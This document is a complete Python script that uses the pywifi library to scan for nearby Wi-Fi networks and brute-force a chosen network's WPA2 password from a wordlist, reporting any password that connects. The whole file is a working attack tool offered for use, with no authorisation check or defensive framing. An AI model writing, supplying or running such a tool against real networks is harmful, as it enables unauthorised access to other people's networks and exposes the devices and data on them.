import pywifi
from pywifi import const
import time
import os

def list_wifi_interfaces():
    """Lists available Wi-Fi interfaces."""
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        print("No Wi-Fi interfaces found.")
        return []

    print("Available Wi-Fi Interfaces:")
    for idx, interface in enumerate(interfaces):
        print(f"[{idx}] {interface.name()}")

    return interfaces

def scan_for_networks(interface):
    """Scans for Wi-Fi networks using the specified interface."""
    print(f"Starting scan on interface: {interface.name()}...")
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete (adjust based on system speed)

    networks = interface.scan_results()
    if not networks:
        print("No Wi-Fi networks found.")
        return []

    print("Available Wi-Fi Networks:")
    network_list = []
    for idx, network in enumerate(networks):
        ssid = network.ssid if network.ssid else "<Hidden SSID>"
        print(f"[{idx}] SSID: {ssid}, Signal: {network.signal}dBm")
        network_list.append((idx, ssid, network.signal))

    return network_list

def brute_force_password(interface, ssid, passwords):
    """Attempts to brute force the Wi-Fi password for a given SSID."""
    print(f"Starting brute force on SSID: {ssid}...")
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    for idx, password in enumerate(passwords):
        profile.key = password
        interface.remove_all_network_profiles()
        temp_profile = interface.add_network_profile(profile)

        interface.connect(temp_profile)
        time.sleep(5)  # Wait for connection attempt

        if interface.status() == const.IFACE_CONNECTED:
            print(f"Password found: {password}")
            interface.disconnect()
            return password

        print(f"Attempt {idx + 1}: {password} failed.")
        interface.disconnect()
        time.sleep(1)

    print("Password not found in the provided list.")
    return None

def sanitize_file_path(file_path):
    """Sanitizes and validates the provided file path."""
    return os.path.abspath(file_path.strip('"'))

def main():
    # List Wi-Fi interfaces
    interfaces = list_wifi_interfaces()
    if not interfaces:
        return

    # Select the first interface (customize as needed)
    selected_interface = interfaces[0]
    print(f"Using interface: {selected_interface.name()}\n")

    # Scan for networks
    networks = scan_for_networks(selected_interface)
    if not networks:
        return

    # Allow user to select a network
    try:
        selected_network_idx = int(input("Enter the index of the network to brute force: "))
        selected_network = networks[selected_network_idx]
    except (ValueError, IndexError):
        print("Invalid selection.")
        return

    ssid = selected_network[1]
    print(f"Selected SSID: {ssid}")

    # Load passwords from a file (update with your file path)
    password_file = input("Enter the path to your password file: ")
    sanitized_path = sanitize_file_path(password_file)
    try:
        with open(sanitized_path, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Password file not found: {sanitized_path}")
        return

    # Start brute forcing
    brute_force_password(selected_interface, ssid, passwords)

if __name__ == "__main__":
    # Ensure required libraries are installed
    # pip install pywifi comtypes
    try:
        import comtypes
    except ImportError:
        print("Missing dependency: comtypes. Install it using 'pip install comtypes'.")
        exit(1)

    # Rename this script to something other than "pywifi.py" (e.g., "wifi_scanner.py")
    # to avoid conflicts with the `pywifi` library when importing.
    main()

